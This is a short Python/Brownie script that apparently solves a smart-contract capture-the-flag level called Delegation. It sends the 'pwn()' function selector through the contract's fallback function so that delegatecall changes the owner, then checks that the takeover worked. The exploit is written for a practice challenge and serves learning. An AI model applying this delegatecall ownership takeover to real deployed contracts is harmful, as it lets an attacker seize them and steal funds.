from scripts.context import *
from scripts.account import _from, acc
from scripts.web3 import web3
from brownie import Delegation

##########################################
# The goal of this level is for you to claim ownership of the instance you are given.
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    delegation = load_challenge(contract_name=Delegation, instance_key='delegation')

    # get the first 4 bytes of the 'pwn()' function hash
    # in order to pass it through msg.data
    pwn_bytes = web3.sha3(text='pwn()').hex()[0:10]

    # use the fallback function in Delegation to send data in the tx
    # and call the pwn() function through the delegatecall low level call
    # because the fallback function is not payable, the value has to be 0
    acc.transfer(to=delegation.address, amount=0, data=pwn_bytes)

    # let's check if this has resulted in me becoming owner of the delegation contract
    owner_assertion = delegation.owner() == acc.address
    print(f'The owner of the contract is {acc.address}, therefore the assertion is {owner_assertion}')

    return owner_assertion

def main():
    solve_challenge()

